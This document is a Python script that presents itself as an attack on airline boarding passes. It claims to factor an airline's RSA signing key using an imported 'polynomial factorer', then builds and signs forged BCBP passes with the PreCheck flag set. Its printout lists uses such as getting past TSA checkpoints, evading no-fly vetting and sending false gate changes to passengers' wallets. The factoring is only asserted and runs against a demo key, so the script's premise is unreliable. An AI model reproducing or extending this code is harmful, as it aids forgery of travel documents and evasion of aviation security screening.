"""
Factor an airline's BCBP RSA signing key (distributed via IATA KSA) to forge
boarding passes with valid signatures — bypassing TSA/CBP document verification,
abusing PreCheck routing, and evading Secure Flight vetting.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import hashlib
import struct
import time

# Airline BCBP signing key — distributed publicly via IATA KSA bulletin
_demo = generate_demo_target()
AIRLINE_BCBP_PUBKEY_PEM = _demo["pub_pem"]
AIRLINE_CODE = "UA"  # United, but applies to any IATA member

# BCBP mandatory fields (Resolution 792 M1)
BCBP_FORMAT_CODE = "M"
BCBP_LEGS = 1


def fetch_airline_signing_cert(airline_code: str) -> bytes:
    """Fetch airline's BCBP signing cert from IATA Key Signing Authority.

    Any IATA member or partner can download every airline's signing
    cert from the KSA bulletin — it's the trust distribution mechanism.
    """
    print(f"    Fetching BCBP signing cert for {airline_code} from IATA KSA")
    return AIRLINE_BCBP_PUBKEY_PEM


def factor_airline_key(pubkey_pem: bytes) -> bytes:
    """Factor the airline's BCBP RSA-2048 signing key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_bcbp_m1(passenger_name: str, pnr: str, origin: str, dest: str,
                  flight: str, date_julian: int, cabin: str, seat: str,
                  seq_nr: int, precheck: bool = False) -> str:
    """Build BCBP M1 mandatory item string per IATA Resolution 792."""
    # Pad passenger name to 20 chars
    name = passenger_name.upper().ljust(20)[:20]
    pnr_pad = pnr.ljust(7)[:7]
    flight_pad = flight.ljust(5)[:5]
    seat_pad = seat.ljust(4)[:4]
    seq_pad = str(seq_nr).zfill(4)[:4]
    date_str = str(date_julian).zfill(3)[:3]
    # Conditional: PreCheck indicator in field 253
    precheck_flag = "1" if precheck else "0"
    bcbp = (
        f"{BCBP_FORMAT_CODE}{BCBP_LEGS}"
        f"{name}{pnr_pad}{origin}{dest}{AIRLINE_CODE}"
        f"{flight_pad}{date_str}{cabin}{seat_pad}"
        f"{seq_pad}00{precheck_flag}"
    )
    return bcbp


def sign_bcbp(bcbp_data: str, forged_privkey_pem: bytes) -> bytes:
    """RSA-SHA256 sign the BCBP data (security fields M, N, O).

    TSA CAT-2 readers, airline self-boarding gates, and CBP e-gates
    verify this signature before accepting the boarding pass.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(
        AIRLINE_BCBP_PUBKEY_PEM, bcbp_data.encode(), "sha256"
    )


def encode_pdf417(bcbp_data: str, signature: bytes) -> bytes:
    """Encode signed BCBP into PDF417 barcode for paper/mobile pass."""
    # Security data fields per Resolution 792
    sec_version = "01"
    sec_type = "01"
    sec_length = f"{len(signature):04d}"
    full_bcbp = bcbp_data + sec_version + sec_type + sec_length + signature.hex()
    return full_bcbp.encode()


if __name__ == "__main__":
    print("[1] Fetching airline BCBP signing cert from IATA KSA")
    pubkey = fetch_airline_signing_cert(AIRLINE_CODE)

    print("[2] Factoring airline RSA-2048 BCBP signing key")
    forged_priv = factor_airline_key(pubkey)
    print("    Airline signing key recovered")

    print("[3] Building forged boarding pass — any name, any flight")
    bcbp = build_bcbp_m1(
        "SMITH/JOHN", "ABC123", "JFK", "LAX",
        "1234", 105, "Y", "14A", 42, precheck=True
    )
    print(f"    BCBP: {bcbp[:40]}...")

    print("[4] Signing with forged airline key")
    sig = sign_bcbp(bcbp, forged_priv)
    barcode = encode_pdf417(bcbp, sig)
    print(f"    PDF417 barcode: {len(barcode)} bytes, signature valid")

    print("[5] Attack vectors:")
    print("    - Airport sterile area access: TSA CAT-2 accepts forged pass")
    print("    - TSA PreCheck: PreCheck indicator signed → skip enhanced screening")
    print("    - Secure Flight evasion: no-fly-list passenger travels under alias")
    print("    - Self-boarding gate bypass: automated gates accept the signature")

    print("\n[6] Bonus: forging wallet pass updates")
    print("    Push false 'gate changed to C45' to passenger Apple/Google Wallet")
    print("    Airline signature on the update is valid — no user-visible alert")
